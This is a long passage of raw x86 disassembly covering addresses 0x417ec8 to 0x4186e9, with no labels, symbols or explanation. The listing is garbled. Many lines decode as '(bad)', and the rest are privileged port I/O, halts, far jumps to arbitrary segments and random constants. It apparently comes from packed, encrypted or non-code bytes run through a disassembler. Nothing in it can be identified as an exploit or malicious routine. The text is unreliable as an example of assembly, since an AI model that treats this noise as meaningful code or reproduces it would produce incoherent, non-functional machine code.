  417ec8:	sub    ebx,DWORD PTR [edx+0x3b]
  417ecb:	js     0x417ea5
  417ecd:	cmp    edi,ebp
  417ecf:	rcl    BYTE PTR [ebx+0xf],1
  417ed2:	mov    esp,0xb1dd4d62
  417ed7:	mov    esi,0x41037e38
  417edc:	out    0x67,eax
  417ede:	cli    
  417edf:	inc    eax
  417ee0:	jge    0x417f18
  417ee2:	mov    dl,BYTE PTR [eax]
  417ee4:	dec    ebx
  417ee5:	div    BYTE PTR [edx+0x1e3360d8]
  417eeb:	sub    eax,0x379fcaca
  417ef0:	mov    ah,0x28
  417ef2:	das    
  417ef3:	stc    
  417ef4:	or     DWORD PTR [ebp+0x35],eax
  417ef7:	sub    BYTE PTR [esi],ch
  417ef9:	or     esp,edi
  417efb:	test   al,0xa7
  417efd:	ins    BYTE PTR es:[edi],dx
  417efe:	popf   
  417eff:	(bad)  
  417f03:	lock jae 0x417e94
  417f06:	test   BYTE PTR [edx+ebx*8],cl
  417f09:	enter  0xb474,0xdb
  417f0d:	pop    esi
  417f0e:	out    0x0,al
  417f10:	or     esi,edx
  417f12:	les    esp,FWORD PTR [ebx+0x74]
  417f15:	sar    DWORD PTR [eax+0x5d],1
  417f18:	fld    DWORD PTR [ebx+0x13]
  417f1b:	hlt    
  417f1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f1d:	idiv   DWORD PTR [ebx-0x34e0aae]
  417f23:	xor    eax,ebp
  417f25:	fnstenv [edi+ecx*4-0x45]
  417f29:	push   esp
  417f2a:	adc    DWORD PTR [esi-0x69862e7a],0xffffffa1
  417f31:	std    
  417f32:	jbe    0x417ed8
  417f34:	jmp    0xbed9c26b
  417f39:	adc    BYTE PTR [ebx],bl
  417f3b:	push   edi
  417f3c:	cdq    
  417f3d:	sub    eax,0xd3abe7b
  417f42:	cmp    esi,esi
  417f44:	jns    0x417ed3
  417f46:	mov    al,ds:0x8b6c13df
  417f4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f4c:	or     al,0x18
  417f4e:	mov    ecx,0x2bd98de2
  417f53:	push   es
  417f54:	pop    ebx
  417f55:	adc    DWORD PTR [ebp-0x748336e6],ecx
  417f5b:	leave  
  417f5c:	push   ds
  417f5d:	dec    edi
  417f5e:	jb     0x417efe
  417f60:	jl     0x417f18
  417f62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f63:	xchg   ebx,eax
  417f64:	mov    dh,0xca
  417f66:	int3   
  417f67:	push   ebx
  417f68:	jns    0x417f8a
  417f6a:	mov    ebp,0x7f0abb54
  417f6f:	rol    DWORD PTR [edx-0x43],0x81
  417f73:	jnp    0x417f34
  417f75:	dec    ebx
  417f76:	add    BYTE PTR [edx],cl
  417f78:	pop    ss
  417f79:	fisttp QWORD PTR ds:0x1d5ddb36
  417f7f:	cld    
  417f80:	(bad)  
  417f81:	out    0x58,eax
  417f83:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f85:	and    ebx,DWORD PTR [ebx+eax*4]
  417f88:	jle    0x418002
  417f8a:	cmp    BYTE PTR [eax],al
  417f8c:	pusha  
  417f8d:	cld    
  417f8e:	std    
  417f8f:	mov    ebp,0xba647d28
  417f94:	nop
  417f95:	(bad)  
  417f96:	push   esi
  417f97:	es hlt 
  417f99:	cmp    eax,0x76ae4d28
  417f9e:	and    ax,0xeb59
  417fa2:	fadd   QWORD PTR ds:0xa97cacd0
  417fa8:	push   ebx
  417fa9:	jl     0x417ff6
  417fab:	lds    edx,FWORD PTR [esi-0x24795b3f]
  417fb1:	mov    al,ds:0x4c408d18
  417fb6:	int    0xda
  417fb8:	mov    edi,0xb386ac97
  417fbe:	pushf  
  417fbf:	mov    ah,0x78
  417fc1:	pop    esi
  417fc2:	shl    esi,cl
  417fc4:	ja     0x417f7a
  417fc6:	mov    dl,0x4f
  417fc8:	jl     0x417fb3
  417fca:	lods   eax,DWORD PTR ds:[esi]
  417fcb:	in     eax,0xf
  417fcd:	add    ah,ah
  417fcf:	xor    eax,0xac30d719
  417fd4:	inc    eax
  417fd5:	and    eax,0x7fd7de6c
  417fda:	test   eax,ebx
  417fdc:	mov    ds:0x1043a56,al
  417fe1:	scas   al,BYTE PTR es:[edi]
  417fe2:	mov    ch,0x93
  417fe4:	xor    al,0x65
  417fe6:	mov    eax,0x7c8d124
  417feb:	(bad)  [ebp+0x18021ddd]
  417ff1:	clc    
  417ff2:	mov    esi,0x19d05390
  417ff7:	icebp  
  417ff8:	mov    eax,0xaa97d43
  417ffd:	jp     0x418054
  417fff:	jns    0x417fae
  418001:	cli    
  418002:	push   esp
  418003:	je     0x417fb2
  418005:	jl     0x417f97
  418007:	add    BYTE PTR [eax+0x73e83d67],0xe0
  41800e:	mov    esi,0xade15648
  418013:	js     0x418000
  418015:	dec    ecx
  418016:	stos   DWORD PTR es:[edi],eax
  418017:	fwait
  418018:	sbb    al,BYTE PTR [edi+0x52]
  41801b:	outs   dx,BYTE PTR ds:[esi]
  41801c:	xor    DWORD PTR [ebp-0xb],ebx
  41801f:	adc    bh,BYTE PTR [eax-0x4b089377]
  418025:	iret   
  418026:	inc    ebx
  418027:	cmp    esp,esp
  418029:	loopne 0x418059
  41802b:	dec    edi
  41802c:	cmp    bl,al
  41802e:	sub    DWORD PTR [esi+esi*2+0x1d2a8391],esp
  418035:	popa   
  418036:	mov    dh,bl
  418038:	retf   0xe53b
  41803b:	idiv   BYTE PTR [ebp+0x9890b32]
  418041:	sbb    eax,0xcad2d98a
  418046:	xchg   esi,eax
  418047:	std    
  418048:	imul   esp,DWORD PTR [ebx],0xd110f869
  41804e:	pop    es
  41804f:	rol    ecx,1
  418051:	call   0xa4fd:0x33b8f75f
  418058:	stos   BYTE PTR es:[edi],al
  418059:	stos   BYTE PTR es:[edi],al
  41805a:	mov    ecx,0xf42e04bc
  41805f:	in     eax,dx
  418060:	call   0xef70:0x97526c72
  418067:	mov    bl,bh
  418069:	jnp    0x4180e1
  41806b:	loop   0x417ffb
  41806d:	or     edx,eax
  41806f:	enter  0xce12,0xb0
  418073:	ja     0x41809a
  418075:	adc    DWORD PTR [ebx+0x5d],ebp
  418078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418079:	ficom  DWORD PTR [ebx-0x2badf539]
  41807f:	xchg   BYTE PTR [ebx-0x4881e7d6],bl
  418085:	das    
  418086:	test   BYTE PTR [edx+edi*4-0x5c844127],bh
  41808d:	(bad)  
  41808e:	stos   BYTE PTR es:[edi],al
  41808f:	mov    ebx,0x93577f90
  418094:	das    
  418095:	mov    ch,0x59
  418097:	sub    BYTE PTR [eax],bl
  418099:	sub    eax,0x71d0b732
  41809e:	mov    fs,WORD PTR [eax+eax*1]
  4180a1:	jnp    0x4180be
  4180a3:	xchg   ecx,eax
  4180a4:	call   0x3cd7:0xac269389
  4180ab:	fs ja  0x418066
  4180ae:	je     0x418089
  4180b0:	inc    ecx
  4180b1:	add    DWORD PTR [esi+0x60177f87],ecx
  4180b7:	add    dh,dh
  4180b9:	call   0xb2e2:0xd063816
  4180c0:	into   
  4180c1:	dec    ecx
  4180c2:	mov    bl,0xd7
  4180c4:	nop
  4180c5:	push   esp
  4180c6:	push   ecx
  4180c7:	xor    DWORD PTR [ecx-0x5],edi
  4180ca:	rcr    BYTE PTR [edx],1
  4180cc:	(bad)  
  4180cd:	sub    BYTE PTR [ecx+0x213924ee],cl
  4180d3:	mov    cl,ah
  4180d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180d6:	aad    0xb7
  4180d8:	fisub  WORD PTR [ecx+edx*8+0x66354755]
  4180df:	dec    edx
  4180e0:	mov    bl,0x4d
  4180e2:	cmp    eax,0xb25e0699
  4180e7:	xchg   ebp,ecx
  4180e9:	xor    eax,0x9b2c7292
  4180ee:	mov    ebp,0x22c3a385
  4180f3:	push   ebp
  4180f4:	std    
  4180f5:	mov    al,ds:0x56d4f26c
  4180fa:	or     eax,0xd8183168
  4180ff:	loope  0x4180c3
  418101:	xor    eax,0xfc5aea97
  418106:	icebp  
  418107:	hlt    
  418108:	jl     0x418185
  41810a:	mov    ah,0xbf
  41810c:	or     WORD PTR [ecx],sp
  41810f:	pop    ds
  418110:	or     DWORD PTR [esi-0x18b1a0d3],edx
  418116:	pop    edi
  418117:	mov    eax,ds:0xa7bf10e4
  41811c:	sub    DWORD PTR [esp+ebx*1+0x0],eax
  418120:	push   eax
  418121:	mov    ch,0xf2
  418123:	jmp    0x6f62:0x402ac78a
  41812a:	jns    0x4180cf
  41812c:	loop   0x4180d3
  41812e:	cmp    al,0xb
  418130:	xchg   esi,eax
  418131:	mov    al,0x4a
  418133:	xchg   edx,eax
  418134:	jl     0x418144
  418136:	aad    0x2
  418138:	aam    0x41
  41813a:	inc    ebp
  41813b:	mov    ecx,0xdcf689ac
  418140:	mov    cl,0xc0
  418142:	idiv   esi
  418144:	out    0x9e,eax
  418146:	in     al,dx
  418147:	imul   edx,DWORD PTR [esi+ebp*8],0x6e7a144
  41814e:	cli    
  41814f:	mov    ds:0x454f1eed,eax
  418154:	mov    ebx,0x50850f33
  418159:	clc    
  41815a:	push   ebx
  41815b:	into   
  41815c:	and    ch,BYTE PTR [edx]
  41815e:	pop    eax
  41815f:	inc    ebx
  418160:	xchg   esp,eax
  418161:	inc    edi
  418162:	cmc    
  418163:	add    DWORD PTR [ebx+0x2c5935dc],0xffffff8b
  41816a:	repnz sbb DWORD PTR [ecx+0x23d119f9],eax
  418171:	and    esi,DWORD PTR [eax-0x3513e7bb]
  418177:	int3   
  418178:	push   ss
  418179:	(bad)  
  41817a:	adc    ebp,DWORD PTR [ebx]
  41817c:	sub    DWORD PTR [eax],eax
  41817e:	sbb    DWORD PTR [ebx],ebx
  418180:	inc    eax
  418181:	ret    0x8668
  418184:	call   0xac0c544a
  418189:	xchg   ebp,eax
  41818a:	mov    eax,ds:0xb008c2a3
  41818f:	sbb    dl,BYTE PTR [ecx+edi*8+0xe]
  418193:	inc    edi
  418194:	push   esi
  418195:	sub    BYTE PTR [ebx-0x37ccf38b],cl
  41819b:	xor    esi,eax
  41819d:	lea    ecx,[esi+ecx*1+0x327298]
  4181a4:	xor    ecx,eax
  4181a6:	jmp    0x4184c0
  4181ab:	sar    BYTE PTR [esi],0xce
  4181ae:	xlat   BYTE PTR ds:[ebx]
  4181af:	(bad)  
  4181b0:	xlat   BYTE PTR ds:[ebx]
  4181b1:	(bad)
  4181b4:	loope  0x41818c
  4181b6:	pop    esp
  4181b7:	dec    ebp
  4181b8:	pop    esp
  4181b9:	xor    eax,0x7f34191b
  4181be:	js     0x41823b
  4181c0:	jle    0x41823a
  4181c2:	js     0x4181ae
  4181c4:	xchg   ecx,eax
  4181c5:	test   BYTE PTR [ebp-0x4c624f25],dl
  4181cb:	arpl   WORD PTR [edx+0x468674fd],cx
  4181d1:	cmc    
  4181d2:	jle    0x4181ce
  4181d4:	mov    DWORD PTR ds:0x27cf46d1,ebp
  4181da:	mov    ecx,0x9c4595cc
  4181df:	out    dx,eax
  4181e0:	jb     0x4181be
  4181e2:	ret    
  4181e3:	mov    bh,0x3b
  4181e5:	lods   al,BYTE PTR ds:[esi]
  4181e6:	xchg   ecx,eax
  4181e7:	daa    
  4181e8:	dec    esi
  4181e9:	or     ebp,esp
  4181eb:	fldcw  WORD PTR [edi]
  4181ed:	or     ecx,edi
  4181ef:	push   0xfffffff2
  4181f1:	inc    esp
  4181f2:	dec    esi
  4181f3:	sbb    DWORD PTR [eax+0x1257a12e],ecx
  4181f9:	lock mov al,0x7b
  4181fc:	(bad)  
  4181fd:	sub    dh,BYTE PTR [esi]
  4181ff:	scas   al,BYTE PTR es:[edi]
  418200:	mov    bh,0xeb
  418202:	mov    edx,0x640dadf2
  418207:	test   al,0x30
  418209:	and    esp,0x761244fd
  41820f:	sub    edi,ebp
  418211:	sti    
  418212:	fcomi  st,st(4)
  418214:	xor    BYTE PTR [eax-0x6e],cl
  418217:	xchg   edx,eax
  418218:	fisubr WORD PTR [edx-0x5d]
  41821b:	neg    eax
  41821d:	dec    edi
  41821e:	test   BYTE PTR [ecx],0xa9
  418221:	mov    BYTE PTR [esi+edi*2],al
  418224:	mov    bh,0x12
  418226:	jbe    0x41824a
  418228:	adc    ecx,DWORD PTR [ebp-0xc2addda]
  41822e:	push   ds
  41822f:	cld    
  418230:	push   es
  418231:	loopne 0x418223
  418233:	das    
  418234:	daa    
  418235:	and    bh,BYTE PTR [ecx+0x74]
  418238:	xchg   esp,eax
  418239:	ss xchg edi,eax
  41823b:	mov    eax,0x86c3834b
  418240:	add    cl,BYTE PTR ds:0x48ea4b6e
  418246:	cmp    al,0xbe
  418248:	sbb    eax,0x5bf98b71
  41824d:	(bad)  
  41824e:	bound  ecx,QWORD PTR [edi-0x4f]
  418251:	js     0x4182a4
  418253:	dec    edi
  418254:	mov    ecx,0xf74f6a8f
  418259:	jnp    0x418231
  41825b:	out    0x9e,eax
  41825d:	pop    esp
  41825e:	popa   
  41825f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418260:	stos   BYTE PTR es:[edi],al
  418261:	add    eax,0xd8dd3af8
  418266:	in     al,0x61
  418268:	push   0x9c20ab2e
  41826d:	mov    ebp,0x5d3f81f
  418272:	sbb    ebp,0x58
  418275:	mov    ebx,0x7dbbe3ef
  41827a:	popf   
  41827b:	mov    ecx,0x6f943c4b
  418280:	fadd   QWORD PTR [ecx-0x4a0eecc4]
  418286:	mov    WORD PTR [esi-0x4f],fs
  418289:	jmp    0x7bd1:0xbe6a7481
  418290:	xor    BYTE PTR [esi+esi*2+0x78],bl
  418294:	jnp    0x418254
  418296:	sub    DWORD PTR [edx],edi
  418298:	push   edi
  418299:	jmp    0xd356:0xb093e849
  4182a0:	push   ss
  4182a1:	jp     0x418255
  4182a3:	mov    al,ds:0x1c1264dc
  4182a8:	inc    eax
  4182a9:	mov    esi,0x466e1859
  4182ae:	pop    edi
  4182af:	mov    al,ds:0xdf9c2368
  4182b4:	lods   al,BYTE PTR ds:[esi]
  4182b5:	cld    
  4182b6:	cmp    BYTE PTR [eax-0x78],cl
  4182b9:	push   ebp
  4182ba:	dec    esi
  4182bb:	cwde   
  4182bc:	outs   dx,BYTE PTR ds:[esi]
  4182bd:	call   0x181173a3
  4182c2:	ss xchg ecx,eax
  4182c4:	mov    ?,WORD PTR [esi+0x8]
  4182c7:	scas   eax,DWORD PTR es:[edi]
  4182c8:	pop    es
  4182c9:	pop    ebp
  4182ca:	inc    ebx
  4182cb:	sub    dh,dh
  4182cd:	out    dx,eax
  4182ce:	mov    dh,0x2a
  4182d0:	adc    cl,BYTE PTR [edx+edx*8-0x1a]
  4182d4:	sbb    BYTE PTR [eax],ch
  4182d6:	sbb    esp,0x25776b10
  4182dc:	xchg   edx,eax
  4182dd:	shl    bl,cl
  4182df:	mov    ecx,0x6889be4f
  4182e4:	sub    BYTE PTR [eax],ah
  4182e6:	add    al,0x23
  4182e8:	and    eax,0x283c450a
  4182ed:	icebp  
  4182ee:	mov    ch,0x1
  4182f0:	sar    DWORD PTR [esi-0x4b44f287],1
  4182f6:	pop    DWORD PTR [eax+0x2210dba4]
  4182fc:	dec    edx
  4182fd:	add    al,0x32
  4182ff:	or     BYTE PTR [edi],bh
  418301:	sbb    eax,0xf2dd15ce
  418306:	add    al,0x66
  418308:	fnstenv [esi+0x28ec7ed]
  41830e:	scas   eax,DWORD PTR es:[edi]
  41830f:	mov    ds:0x1a29e7b,al
  418314:	leave  
  418315:	jae    0x41832a
  418317:	or     ebx,esi
  418319:	cmp    esi,DWORD PTR [ecx-0x43]
  41831c:	xchg   BYTE PTR [ebp+0x44],dh
  41831f:	iret   
  418320:	dec    esp
  418321:	pop    edi
  418322:	lods   al,BYTE PTR ds:[esi]
  418323:	pushf  
  418324:	lea    ebx,[ebp+ebx*8+0x8]
  418328:	clc    
  418329:	or     eax,0x1ff9b148
  41832e:	xlat   BYTE PTR ds:[ebx]
  41832f:	inc    eax
  418330:	sub    BYTE PTR [esi+0x72],bh
  418333:	mov    bh,0xc5
  418335:	jae    0x418351
  418337:	sbb    DWORD PTR [ebx],0xffffff82
  41833a:	mov    BYTE PTR [ebx-0x16cbb2cb],dh
  418340:	pusha  
  418341:	sub    BYTE PTR [edx+esi*8-0xb],0x8d
  418346:	mov    BYTE PTR [edx-0x4fc55834],cl
  41834c:	mov    ebp,0x2de6a469
  418351:	push   edx
  418352:	push   ds
  418353:	jp     0x418316
  418355:	push   esi
  418356:	into   
  418357:	or     DWORD PTR [esi],ecx
  418359:	cdq    
  41835a:	cmp    DWORD PTR [eax-0x14],edx
  41835d:	sub    ebp,edi
  41835f:	cli    
  418360:	call   0xcd78:0x1f5d1a36
  418367:	jb     0x41835a
  418369:	ret    0x1aa6
  41836c:	test   eax,0xc00c8a5a
  418371:	inc    esp
  418372:	mov    cl,0x76
  418374:	addr16 or al,0x10
  418377:	pop    ebp
  418378:	mov    ah,BYTE PTR [ecx]
  41837a:	mov    esi,0x8a643cbe
  41837f:	and    eax,0x6dd041da
  418384:	ins    BYTE PTR es:[edi],dx
  418385:	fild   DWORD PTR [ebx]
  418387:	sub    edi,DWORD PTR [ebp+0x4b]
  41838a:	or     dl,cl
  41838c:	aas    
  41838d:	aam    0x49
  41838f:	into   
  418390:	ret    
  418391:	cld    
  418392:	or     ecx,eax
  418394:	xchg   ebx,eax
  418395:	fwait
  418396:	ins    DWORD PTR es:[edi],dx
  418397:	cld    
  418398:	fwait
  418399:	idiv   DWORD PTR [ebx]
  41839b:	out    dx,al
  41839c:	pusha  
  41839d:	pop    esp
  41839e:	data16 jl 0x418381
  4183a1:	inc    ebx
  4183a2:	mov    edx,0xf6c33106
  4183a7:	cmp    DWORD PTR [ecx+esi*4-0x46],edi
  4183ab:	add    BYTE PTR [edi],dl
  4183ad:	mov    ecx,0x6b83ef54
  4183b2:	jl     0x418383
  4183b4:	sub    al,BYTE PTR [esi-0x1d891b50]
  4183ba:	sub    DWORD PTR [ecx],esp
  4183bc:	jnp    0x418434
  4183be:	add    al,0x49
  4183c0:	icebp  
  4183c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183c2:	dec    ebx
  4183c3:	jbe    0x41841a
  4183c5:	mov    dx,0x2010
  4183c9:	stos   DWORD PTR es:[edi],eax
  4183ca:	and    esp,0x444f78c7
  4183d0:	xlat   BYTE PTR ds:[ebx]
  4183d1:	jg     0x418365
  4183d3:	adc    bl,BYTE PTR [edi+0x74]
  4183d6:	into   
  4183d7:	add    BYTE PTR [edx],cl
  4183d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183da:	add    eax,0xcfbd6d35
  4183df:	or     BYTE PTR [ecx+0xa],dh
  4183e2:	int    0x69
  4183e4:	lods   al,BYTE PTR ds:[esi]
  4183e5:	jo     0x41843e
  4183e7:	xchg   edx,eax
  4183e8:	pop    edi
  4183e9:	cmp    BYTE PTR [edx-0x72],dh
  4183ec:	xchg   esp,eax
  4183ed:	stos   BYTE PTR es:[edi],al
  4183ee:	cmc    
  4183ef:	ins    BYTE PTR es:[edi],dx
  4183f0:	pop    esp
  4183f1:	xchg   eax,eax
  4183f3:	push   ecx
  4183f4:	mov    ebx,0x1da54dc7
  4183f9:	or     esi,DWORD PTR [esi-0x6e]
  4183fc:	sub    al,0xf5
  4183fe:	fst    QWORD PTR [edi-0x52]
  418401:	pusha  
  418402:	div    BYTE PTR [eax+0x1c]
  418405:	xor    edi,DWORD PTR [eax]
  418407:	jne    0x4183fa
  418409:	outs   dx,BYTE PTR ds:[esi]
  41840a:	pop    ss
  41840b:	mov    esp,0xbf52dc94
  418410:	mov    eax,0xafdad1b7
  418415:	add    bl,bl
  418417:	sub    eax,0x10a00548
  41841c:	jmp    0x2dd0:0x9b61ae27
  418423:	ja     0x418471
  418425:	jo     0x4183fd
  418427:	mov    ebx,0x3f8e58fc
  41842c:	rol    DWORD PTR [edi-0x40cd8b66],cl
  418432:	nop
  418433:	xchg   edx,eax
  418434:	dec    edi
  418435:	mov    cl,0x9b
  418437:	mul    DWORD PTR [ebx-0x65281703]
  41843d:	aam    0xe3
  41843f:	push   ecx
  418440:	lahf   
  418441:	sub    ecx,DWORD PTR [edi+0x1783cbb5]
  418447:	mov    cl,0x9b
  418449:	lea    esi,[ecx+0x2fd5e43e]
  41844f:	mov    esp,0x70c70f79
  418454:	ds xchg ebp,eax
  418456:	jno    0x4184a0
  418458:	adc    eax,0x5016931c
  41845d:	push   esp
  41845e:	cs cmp al,0x55
  418461:	add    eax,0x74ed1781
  418466:	sub    al,ch
  418468:	test   al,0x8c
  41846a:	push   0xedcfe469
  41846f:	mov    eax,ds:0x696756fe
  418474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418475:	push   DWORD PTR [ecx]
  418477:	mov    ds:0x93cf4781,al
  41847c:	mov    ch,0x78
  41847e:	das    
  41847f:	cmp    dh,bl
  418481:	and    DWORD PTR ds:0x53da7ced,edx
  418487:	dec    esi
  418488:	outs   dx,DWORD PTR ds:[esi]
  418489:	mov    cs,WORD PTR [esi-0x4c]
  41848c:	aam    0x3c
  41848e:	lldt   WORD PTR [esi-0x30]
  418492:	sub    DWORD PTR [ecx-0xd],esi
  418495:	mov    dx,0x512
  418499:	in     al,dx
  41849a:	and    ch,cl
  41849c:	sbb    esi,esi
  41849e:	mov    ebp,fs
  4184a0:	fnstcw WORD PTR [esi+0x68]
  4184a3:	nop
  4184a4:	pop    ecx
  4184a5:	ds (bad) 
  4184a7:	cld    
  4184a8:	rcr    DWORD PTR [eax],1
  4184aa:	jne    0x41842c
  4184ac:	push   ds
  4184ad:	mov    cl,0x35
  4184af:	pop    esi
  4184b0:	bound  ecx,QWORD PTR [edx]
  4184b2:	fcmovb st,st(5)
  4184b4:	bound  ebx,QWORD PTR [esp+ecx*2]
  4184b7:	dec    esp
  4184b8:	mov    dh,0xd7
  4184ba:	stc    
  4184bb:	cli    
  4184bc:	repnz mov ebx,0xf9819fb1
  4184c2:	sub    BYTE PTR [ebp-0x7af00764],al
  4184c8:	inc    esi
  4184c9:	stc    
  4184ca:	(bad)  
  4184cb:	(bad)  
  4184cc:	jmp    0x418819
  4184d1:	jmp    0x4187eb
  4184d6:	int3   
  4184d7:	les    edi,FWORD PTR [edi+ecx*8]
  4184da:	aam    0xd7
  4184dc:	ror    ebx,cl
  4184de:	mov    esi,0x27ec6d48
  4184e3:	mov    al,BYTE PTR [edi+0x7f3914ce]
  4184e9:	js     0x418566
  4184eb:	jle    0x418565
  4184ed:	js     0x41850d
  4184ef:	shl    BYTE PTR [ebp+0x50],0xab
  4184f3:	lea    edi,[eax+0x4869512f]
  4184f9:	jmp    0x712442bd
  4184fe:	and    DWORD PTR [ebx+0x323a93a],ebp
  418504:	mov    ebp,0xcc9659c5
  418509:	adc    BYTE PTR [esi+0x1c09a8f5],ah
  41850f:	lock mov ebp,0xbc4a5d8d
  418515:	jecxz  0x41854f
  418517:	inc    edx
  418518:	jb     0x41855d
  41851a:	lock sar DWORD PTR [ebx-0x70],1
  41851e:	add    al,0x3b
  418520:	int3   
  418521:	mov    esp,0xccd61681
  418526:	xlat   BYTE PTR ds:[ebx]
  418527:	sbb    DWORD PTR [ebx+0xa11b1c2],esp
  41852d:	add    bl,BYTE PTR [esi-0x5786ae57]
  418533:	inc    ebx
  418534:	push   ss
  418535:	mov    eax,0x9ea0a54f
  41853a:	call   0xe5cd5c0c
  41853f:	jmp    0x9fa3:0x87a17a26
  418546:	jbe    0x418594
  418548:	push   edi
  418549:	jmp    0x418516
  41854b:	add    ah,dh
  41854d:	inc    eax
  41854e:	cmp    BYTE PTR [ebx],al
  418550:	shr    BYTE PTR [ecx-0x6475b86a],0x97
  418557:	iret   
  418558:	jae    0x418519
  41855a:	push   ds
  41855b:	inc    ecx
  41855c:	xor    eax,0x2d2705d4
  418561:	sbb    eax,0xf28ce5ed
  418566:	out    0xa8,al
  418568:	or     ebx,DWORD PTR [ebx+0x63]
  41856b:	cmc    
  41856c:	jecxz  0x4184fa
  41856e:	data16 and al,0x8d
  418571:	jns    0x4185dc
  418573:	pop    ss
  418574:	repnz cmp DWORD PTR fs:[ecx],0xabac8533
  41857c:	and    eax,0x4fbe115c
  418581:	mov    esp,0x7e43e818
  418586:	fdiv   QWORD PTR [ebx-0x24]
  418589:	sbb    eax,DWORD PTR [ebx]
  41858b:	mov    BYTE PTR [ecx],ch
  41858d:	sbb    esp,ebx
  41858f:	outs   dx,DWORD PTR ds:[esi]
  418590:	in     al,dx
  418591:	ret    
  418592:	push   esp
  418593:	inc    esp
  418594:	cmp    esi,DWORD PTR [esi+0x7c39d15d]
  41859a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41859b:	jg     0x41853f
  41859d:	mov    ch,0xf7
  41859f:	cdq    
  4185a0:	mov    bh,BYTE PTR [edx-0x24]
  4185a3:	xchg   ecx,eax
  4185a4:	in     eax,0xd7
  4185a6:	mov    DWORD PTR ds:0x267152d7,eax
  4185ac:	(bad)  
  4185ad:	jle    0x41858e
  4185af:	or     BYTE PTR [ecx+0x4bf5650f],bh
  4185b5:	test   eax,0x7ffcb8d1
  4185ba:	gs gs out 0xdb,eax
  4185be:	repz ret 
  4185c0:	pop    ds
  4185c1:	ds (bad) 
  4185c3:	sti    
  4185c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185c5:	lea    edi,[eax-0x42]
  4185c8:	int    0x25
  4185ca:	xor    DWORD PTR [edx],edx
  4185cc:	loope  0x41858d
  4185ce:	cmp    al,bl
  4185d0:	jae    0x418583
  4185d2:	mov    al,ds:0x89729244
  4185d7:	fcom   QWORD PTR [ecx]
  4185d9:	out    dx,eax
  4185da:	xchg   esi,eax
  4185db:	pop    edx
  4185dc:	or     DWORD PTR fs:[esi],0xd37aa712
  4185e3:	or     DWORD PTR [esi-0x2b],ecx
  4185e6:	xor    eax,0x5913d377
  4185eb:	in     al,dx
  4185ec:	pop    ebx
  4185ed:	stc    
  4185ee:	rcr    DWORD PTR [bx+di+0x2f],0x64
  4185f3:	inc    DWORD PTR [ebx+0x4d]
  4185f6:	and    DWORD PTR [esi+0x7a],0x68
  4185fa:	scas   al,BYTE PTR es:[edi]
  4185fb:	pushf  
  4185fc:	mov    dh,BYTE PTR [eax-0x36]
  4185ff:	adc    BYTE PTR fs:[ebp+0x39],0xd6
  418604:	out    dx,al
  418605:	pop    ebx
  418606:	push   0xa36b3ace
  41860b:	xor    esi,DWORD PTR [esi-0xaa4cc45]
  418611:	int3   
  418612:	mov    es,WORD PTR [ebx+ebx*2-0x7]
  418616:	adc    al,0xba
  418618:	mov    esp,DWORD PTR [ebx]
  41861a:	loope  0x418667
  41861c:	rcl    BYTE PTR [edx+0xeb99135],cl
  418622:	int3   
  418623:	mov    cl,0x64
  418625:	popf   
  418626:	not    DWORD PTR [ebp-0x93680e7]
  41862c:	sahf   
  41862d:	adc    al,0xff
  41862f:	or     ebx,DWORD PTR [ecx]
  418631:	sub    ebx,DWORD PTR [eax-0x69]
  418634:	shl    DWORD PTR [esi+0x5d5cda6b],0x2c
  41863b:	and    bh,dl
  41863d:	xchg   esi,eax
  41863e:	jp     0x418608
  418640:	rcl    BYTE PTR [edx],1
  418642:	rcr    BYTE PTR [edi+0x0],0x69
  418646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418647:	adc    al,0x6
  418649:	lock jecxz 0x41866c
  41864c:	inc    edx
  41864d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41864e:	bound  esi,QWORD PTR [esi]
  418650:	fisttp WORD PTR ds:0x290d78e
  418656:	mov    ecx,0x4a3c3830
  41865b:	mov    esp,0xaa1b6c5a
  418660:	xor    ebp,edx
  418662:	xchg   ecx,eax
  418663:	mov    al,0xe5
  418665:	adc    edi,DWORD PTR [ebx+0x5e]
  418668:	in     eax,dx
  418669:	or     eax,0x6b313f2f
  41866e:	mov    BYTE PTR [ecx-0x53],ch
  418671:	aaa    
  418672:	add    DWORD PTR [ebp+0x3d5ba2b6],0xffffffd0
  418679:	sbb    ah,BYTE PTR [ebp+0x4bf35ce5]
  41867f:	(bad)  
  418680:	lock int 0x4c
  418683:	dec    edi
  418684:	inc    eax
  418685:	fmul   DWORD PTR [eax+ecx*8+0x5e]
  418689:	mov    esi,0xd3c9e1b5
  41868e:	fmul   DWORD PTR [ecx+0x4e]
  418691:	arpl   WORD PTR gs:[edi+0x76],bp
  418695:	pop    eax
  418696:	fadd   DWORD PTR [ecx+0x23888cda]
  41869c:	and    eax,0x6581b802
  4186a1:	je     0x418675
  4186a3:	add    BYTE PTR [ecx-0x32c59a73],cl
  4186a9:	pop    ecx
  4186aa:	push   ecx
  4186ab:	and    esp,DWORD PTR [eax-0x5cbc0890]
  4186b1:	rol    DWORD PTR [ecx+0x4361d4e2],0xa2
  4186b8:	xor    DWORD PTR [edi-0x63fb79b4],ebx
  4186be:	jb     0x41866a
  4186c0:	inc    BYTE PTR ds:0x18201e4
  4186c6:	jne    0x418716
  4186c8:	push   0xffffffb1
  4186ca:	in     eax,dx
  4186cb:	inc    esp
  4186cc:	sub    DWORD PTR [ebp+0x2f],ebp
  4186cf:	inc    ebx
  4186d0:	sub    BYTE PTR [ecx+0x2c04f8e1],ah
  4186d6:	inc    eax
  4186d7:	shl    ebx,0xf
  4186da:	xchg   ebp,eax
  4186db:	add    eax,0x6ec94372
  4186e0:	(bad)
  4186e3:	fwait
  4186e4:	dec    ecx
  4186e5:	in     al,dx
  4186e6:	jns    0x418691
  4186e8:	cli    
  4186e9:	pop    DWORD PTR [ecx]
